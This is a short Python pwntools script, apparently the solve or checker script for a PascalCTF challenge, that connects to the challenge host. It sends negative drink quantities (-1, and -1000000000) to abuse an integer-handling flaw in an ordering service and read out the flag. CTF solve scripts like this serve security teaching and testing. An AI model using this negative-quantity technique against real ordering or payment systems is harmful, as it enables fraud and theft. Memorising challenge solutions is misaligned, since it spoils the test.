#!/usr/bin/env python3

import os
from pwn import *
import logging
logging.disable()


HOST = os.environ.get("HOST", "malta.ctf.pascalctf.it")
PORT = int(os.environ.get("PORT", 9001))

def checker1():
   p = remote(HOST,PORT)
   p.sendlineafter(b'Select a drink: ', b'10')
   p.sendlineafter(b'want? ', b'-1')
   p.recvuntil(b'recipe: ')
   flag = p.recvline().strip().decode()
   return flag

def checker2():
   p = remote(HOST,PORT)
   p.sendlineafter(b'Select a drink: ', b'2')
   p.sendlineafter(b'want? ', b'-1000000000')
   p.recvuntil(b'recipe: ')
   p.sendlineafter(b'Select a drink: ', b'10')
   p.sendlineafter(b'want? ', b'1')
   p.recvuntil(b'recipe: ')
   flag = p.recvline().strip().decode()
   return flag

print(checker1())
print(checker2())